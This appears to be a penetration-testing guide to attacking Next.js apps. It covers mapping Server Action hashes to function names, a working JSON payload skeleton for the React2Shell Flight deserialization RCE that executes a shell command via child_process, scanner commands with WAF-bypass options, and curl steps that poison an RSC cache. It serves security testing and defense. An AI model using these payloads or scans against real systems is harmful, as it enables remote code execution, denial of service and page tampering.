# NextJS - Server Actions Enumeration

## Next.js Server Actions Enumeration (hash to function name via source maps)


Modern Next.js uses “Server Actions” that execute on the server but are invoked from the client. In production these invocations are opaque: all POSTs land on a common endpoint and are distinguished by a build-specific hash sent in the `Next-Action` header. Example:

```http
POST /
Next-Action: a9f8e2b4c7d1...
```

When `productionBrowserSourceMaps` is enabled, minified JS chunks contain calls to `createServerReference(...)` that leak enough structure (plus associated source maps) to recover a mapping between the action hash and the original function name. This lets you translate hashes observed in `Next-Action` into concrete targets like `deleteUserAccount()` or `exportFinancialData()`.

### Extraction approach (regex on minified JS + optional source maps)

Search downloaded JS chunks for `createServerReference` and extract the hash and the function/source symbol. Two useful patterns:

```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```

- Group 1: server action hash (40+ hex chars)
- Group 2: symbol or path that can be resolved to the original function via the source map when present

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### Practical workflow

- Passive discovery while browsing: capture requests with `Next-Action` headers and JS chunk URLs.
- Fetch the referenced JS bundles and accompanying `*.map` files (when present).
- Run the regex above to build a hash↔name dictionary.
- Use the dictionary to target testing:
  - Name-driven triage (e.g., `transferFunds`, `exportFinancialData`).
  - Track coverage across builds by function name (hashes rotate across builds).

### Exercising hidden actions (template-based request)

Take a valid POST observed in-proxy as a template and swap the `Next-Action` value to target another discovered action:

```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```

Replay in Repeater and test authorization, input validation and business logic of otherwise unreachable actions.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) automates the above in Burp:
  - Mines proxy history for JS chunks, extracts `createServerReference(...)` entries, and parses source maps when available.
  - Maintains a searchable hash↔function-name dictionary and de-duplicates across builds by function name.
  - Can locate a valid template POST and open a ready-to-send Repeater tab with the target action’s hash swapped in.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- Requires `productionBrowserSourceMaps` enabled in production to recover names from bundles/source maps.
- Function-name disclosure is not a vulnerability by itself; use it to guide discovery and test each action’s authorization.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments that expose Server Actions on `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** contain a critical server-side prototype pollution during **Flight** chunk deserialization. By crafting `$` references inside a Flight payload an attacker can pivot from polluted prototypes to arbitrary JavaScript execution and then to OS command execution inside the Node.js process.

#### Attack chain in Flight chunks

1. **Prototype pollution primitive:** Set `"then": "$1:__proto__:then"` so that the resolver writes a `then` function on `Object.prototype`. Any plain object processed afterwards becomes a thenable, letting the attacker influence async control flow inside RSC internals.
2. **Rebinding to the global `Function` constructor:** Point `_response._formData.get` at `"$1:constructor:constructor"`. During resolution, `object.constructor` → `Object`, and `Object.constructor` → `Function`, so future calls to `_formData.get()` actually execute `Function(...)`.
3. **Code execution via `_prefix`:** Place JavaScript source in `_response._prefix`. When the polluted `_formData.get` is invoked, the framework evaluates `Function(_prefix)(...)`, so the injected JS can run `require('child_process').exec()` or any other Node primitive.

#### Payload skeleton

```json
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "require('child_process').exec('id')",
    "_chunks": "$Q2",
    "_formData": { "get": "$1:constructor:constructor" }
  }
}
```

#### Mapping React Server Function exposure

React Server Functions (RSF) are any functions that include the `'use server';` directive. Every form action, mutation, or fetch helper bound to one of those functions becomes an RSC Flight endpoint that will happily deserialize attacker-supplied payloads. Useful recon steps derived from React2Shell assessments:

- **Static inventory:** look for the directive to understand how many RSFs are being automatically exposed by the framework.

```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```

- **App Router defaults:** `create-next-app` enables the App Router + `app/` directory by default, which silently turns every route into an RSC-capable endpoint. App Router assets such as `/_next/static/chunks/app/` or responses that stream Flight chunks over `text/x-component` are strong Internet-facing fingerprints.
- **Implicitly vulnerable RSC deployments:** React’s own advisory notes that apps shipping the RSC runtime can be exploitable **even without explicit RSFs**, so treat any build using `react-server-dom-*` 19.0.0–19.2.0 as suspect.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. reuse the same serializer and inherit the identical remote attack surface until they embed patched React builds.

#### Version coverage (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **vulnerable** in 19.0.0, 19.1.0–19.1.1 and 19.2.0; **patched** in 19.0.1, 19.1.2 and 19.2.1 respectively.
- **Next.js stable:** App Router releases 15.0.0–16.0.6 embed the vulnerable RSC stack. Patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 include fixed deps, so any build below those versions is high-value.
- **Next.js canary:** `14.3.0-canary.77+` also ships the buggy runtime and currently lacks patched canary drops, making those fingerprints strong exploitation candidates.

#### Remote detection oracle

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) sends a crafted multipart Flight request to candidate paths and watches server-side behavior:

- **Default mode** executes a deterministic RCE payload (math operation reflected via `X-Action-Redirect`) proving code execution.
- **`--safe-check` mode** purposefully malforms the Flight message so patched servers return `200/400`, while vulnerable targets emit `HTTP/500` responses containing the `E{"digest"` substring inside the body. That `(500 + digest)` pair is currently the most reliable remote oracle published by defenders.
- Built-in `--waf-bypass`, `--vercel-waf-bypass`, and `--windows` switches adjust payload layout, prepend junk, or swap OS commands so you can probe real Internet assets.

```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```

### Other recent App Router issues (late 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – malformed Flight payloads can spin the RSC resolver into an infinite loop (pre-auth DoS) or force serialization of compiled Server Function code for other actions. App Router builds ≥13.3 are affected until patched; 15.0.x–16.0.x need the specific patch lines from the upstream advisory. Reuse the normal Server Action path but stream a `text/x-component` body with abusive `$` references. Behind a CDN the hung connection is kept open by cache timeouts, making the DoS cheap.
   - **Triage tip:** Unpatched targets return `500` with `E{"digest"` after malformed Flight payloads; patched builds return `400/200`. Test any endpoint already streaming Flight chunks (look for `Next-Action` headers or `text/x-component` responses) and replay with a modified payload.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – missing `Vary` let an `Accept: text/x-component` response get cached and served to browsers expecting HTML. A single priming request can replace the page with raw RSC payloads. PoC flow:
   ```bash
   # Prime CDN with an RSC response
   curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
   # Immediately fetch without Accept (victim view)
   curl -k "https://target/app/dashboard" | head
   ```
   If the second response returns JSON Flight data instead of HTML, the route is poisonable. Purge cache after testing.
